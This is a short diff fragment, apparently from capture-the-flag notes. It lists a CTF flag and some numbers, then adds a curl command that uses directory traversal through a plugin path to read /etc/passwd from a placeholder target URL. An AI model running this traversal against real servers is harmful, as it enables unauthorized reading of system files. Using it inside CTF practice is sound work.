@@ -310,3 +310,4 @@ dalCTF{WhY_$O_L0N5}
 6221261999999992
 3138922093929320898
 3100000000000000005
+curl --path-as-is "https://ТВОЙ_URL/public/plugins/welcome/../../../../../../../../etc/passwd"
